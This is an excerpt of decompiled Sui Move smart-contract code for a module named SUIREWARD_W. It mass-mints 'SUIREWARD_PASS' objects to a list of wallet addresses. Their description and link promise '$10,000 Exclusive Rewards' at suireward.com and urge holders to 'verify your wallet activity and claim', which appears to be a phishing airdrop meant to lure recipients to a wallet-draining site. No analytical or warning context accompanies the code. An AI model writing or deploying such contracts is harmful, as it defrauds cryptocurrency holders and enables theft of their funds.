module 0x36096dcf37893277212da85a01efdbd1229c65f75d8149a6dfd278e2a84dff61::SUIREWARD_W {
    ...
    public entry fun DistributeReward(arg0: vector<address>, arg1: &mut 0x2::tx_context::TxContext) {
        while (0x1::vector::length<address>(&arg0) > 0) {
            let v0 = SUIREWARD_PASS{
                ...
                image_url   : 0x1::string::utf8(b"https://suicamp.b-cdn.net/suireward/suireward_item.jpg"),
                description : 0x1::string::utf8(b"$10,000 Exclusive Rewards are ready at suireward.com. Verify your wallet activity and claim your reward."),
    ...
    fun init(arg0: SUIREWARD_W, arg1: &mut 0x2::tx_context::TxContext) {
        ...
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"https://suicamp.b-cdn.net/suireward/suireward_item.jpg"));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"$10,000 Exclusive Rewards are ready at suireward.com. Verify your wallet activity and claim your reward."));
        0x1::vector::push_back<0x1::string::String>(v3, 0x1::string::utf8(b"https://suireward.com"));
